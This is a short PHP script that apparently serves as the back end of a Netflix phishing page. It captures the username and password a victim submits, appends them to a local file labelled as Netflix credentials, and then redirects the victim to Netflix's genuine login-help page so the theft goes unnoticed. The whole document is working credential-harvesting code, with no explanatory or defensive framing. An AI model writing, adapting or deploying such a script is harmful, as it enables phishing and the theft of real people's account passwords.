<?php

file_put_contents("usernames.txt", "Netflix Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://www.netflix.com/us/LoginHelp');
exit();
?>